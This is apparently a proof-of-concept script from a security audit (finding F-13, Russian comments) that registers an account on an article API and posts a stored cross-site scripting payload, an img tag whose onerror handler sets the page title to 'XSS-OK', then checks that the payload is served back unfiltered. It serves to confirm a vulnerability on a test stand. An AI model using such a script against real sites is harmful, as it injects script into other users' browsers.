# -*- coding: utf-8 -*-
"""F-13. Тело статьи сохраняется как HTML. Фильтр на странице вырезает только <script>.
Открыть напечатанный URL в браузере стенда: document.title станет XSS-OK.
"""
import time

from _http import Client, parser

PAYLOAD = '<img src=x alt="xss-marker" onerror="document.title=\'XSS-OK\'">'


def main():
    p = parser("Хранимая XSS в теле статьи")
    args = p.parse_args()
    client = Client(args.base)
    stamp = str(int(time.time()))[-6:]
    token = client.register(f"xss{stamp}", f"xss{stamp}@poc.local", "Passw0rd!xss")
    status, data, raw = client.call(
        "POST",
        "/api/articles",
        token=token,
        body={
            "article": {
                "title": f"Poc xss {stamp}",
                "description": "plain",
                "body": PAYLOAD,
                "tagList": ["poc"],
            }
        },
    )
    if status not in (200, 201) or PAYLOAD not in (data or {}).get("article", {}).get("body", ""):
        raise SystemExit(f"статья не сохранила разметку: {status} {raw[:300]!r}")
    slug = data["article"]["slug"]
    status, again, _ = client.call("GET", f"/api/articles/{slug}")
    if status != 200 or again["article"]["body"] != PAYLOAD:
        raise SystemExit("анонимное чтение не вернуло payload")
    print(f"OK откройте в браузере: {client.base}/article/{slug}")
    print("ожидаемый document.title: XSS-OK")


if __name__ == "__main__":
    main()
